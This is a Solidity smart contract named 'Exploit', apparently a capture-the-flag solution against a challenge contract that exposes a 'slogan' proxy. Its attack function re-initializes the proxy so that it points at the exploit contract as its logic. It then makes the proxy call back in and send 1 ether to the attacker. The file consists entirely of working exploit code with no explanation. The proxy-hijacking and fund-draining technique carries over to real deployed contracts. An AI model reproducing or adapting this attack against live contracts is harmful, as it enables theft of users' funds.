pragma solidity 0.8.11;
interface IChallenge {
    function callSloganContract(bytes memory data) external payable;
    function sloganContract() external returns (address);
}

interface ISloganProxy {
    function initialize(address _logic, bytes memory _data) external payable;
}

contract Exploit {
    address escape;
    IChallenge challenge;
    ISloganProxy proxy;

    constructor(IChallenge _challenge, ISloganProxy _proxy) payable {
        challenge = _challenge;
        proxy = _proxy;
        escape = address(this);
    }

    function attack() public payable {
        address slogan_proxy = challenge.sloganContract();
        bytes32 x = bytes32(bytes20(uint160(address(this))));

        bytes memory data1 = abi.encodeWithSignature("initialize(address,bytes)", escape, "");
        challenge.callSloganContract(data1);

        bytes memory data2 = abi.encodeWithSignature("attack2(address)", escape);
        challenge.callSloganContract(data2);
    }

    function attack2(address reciepient) public payable {
        reciepient.call{value: 1 ether}("");
    }

    receive() external payable {}

    fallback() external payable {}
}
